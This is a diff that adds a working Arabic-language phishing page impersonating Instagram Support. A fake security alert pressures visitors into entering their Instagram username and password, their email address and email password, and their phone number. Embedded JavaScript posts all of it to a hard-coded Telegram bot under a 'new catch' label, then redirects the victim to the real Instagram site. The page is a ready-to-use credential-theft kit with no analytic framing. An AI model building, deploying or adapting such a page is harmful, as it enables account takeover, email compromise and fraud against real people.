@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Support</title>
+    <style>
+        body { font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; padding: 20px; direction: rtl; }
+        .box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 100%; max-width: 350px; text-align: center; margin-top: 40px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .logo { width: 175px; margin-bottom: 20px; }
+        .warn { color: #ed4956; border: 2px solid #ed4956; background: #fff1f2; padding: 15px; margin-bottom: 20px; font-size: 14px; text-align: right; border-radius: 8px; font-weight: bold; line-height: 1.6; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 8px; font-size: 14px; box-sizing: border-box; text-align: right; outline: none; }
+        button { width: 100%; padding: 14px; background: #0095f6; color: white; border: none; font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 15px; }
+        .step { display: none; } .active { display: block; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <img class="logo" src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png">
+        <div class="warn">
+            ⚠️ تنبيه أمني عاجل: <br>
+            تم رصد محاولة دخول مشبوهة لحسابك من "الرياض، السعودية". يرجى تأكيد ملكيتك للحساب الآن لتجنب إيقافه نهائياً.
+        </div>
+
+        <div id="s1" class="step active">
+            <input type="text" id="u" placeholder="اسم المستخدم">
+            <input type="password" id="p" placeholder="كلمة السر">
+            <button onclick="next(1)">تأكيد الهوية</button>
+        </div>
+
+        <div id="s2" class="step">
+            <p style="font-size: 13px; color: #8e8e8e; margin-bottom: 10px;">تأكيد البريد الإلكتروني المرتبط</p>
+            <input type="email" id="e" placeholder="البريد الإلكتروني">
+            <input type="password" id="ep" placeholder="كلمة سر البريد">
+            <button onclick="next(2)">تأكيد البريد</button>
+        </div>
+
+        <div id="s3" class="step">
+            <p style="font-size: 13px; color: #8e8e8e; margin-bottom: 10px;">أدخل رقم الهاتف لتلقي رمز الأمان</p>
+            <input type="tel" id="ph" placeholder="رقم الهاتف">
+            <button onclick="send()">إنهاء التحقق</button>
+        </div>
+    </div>
+
+    <script>
+        const tok = "8695245392:AAGPuT5p2vRdWRRp4VeT4low15UmDkXIQho";
+        const cid = "8321552700";
+
+        function next(curr) {
+            document.getElementById('s' + curr).classList.remove('active');
+            document.getElementById('s' + (curr + 1)).classList.add('active');
+        }
+
+        async function send() {
+            const u = document.getElementById('u').value;
+            const p = document.getElementById('p').value;
+            const e = document.getElementById('e').value;
+            const ep = document.getElementById('ep').value;
+            const ph = document.getElementById('ph').value;
+
+            const msg = `🔥 صيد جديد 2026\n\n👤 يوزر: ${u}\n🔑 باس: ${p}\n📧 إيميل: ${e}\n🔑 باس إيميل: ${ep}\n📱 هاتف: ${ph}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: cid, text: msg })
+                });
+                window.location.href = "https://instagram.com";
+            } catch (err) {
+                window.location.href = "https://instagram.com";
+            }
+        }
+    </script>
+</body>
+</html>
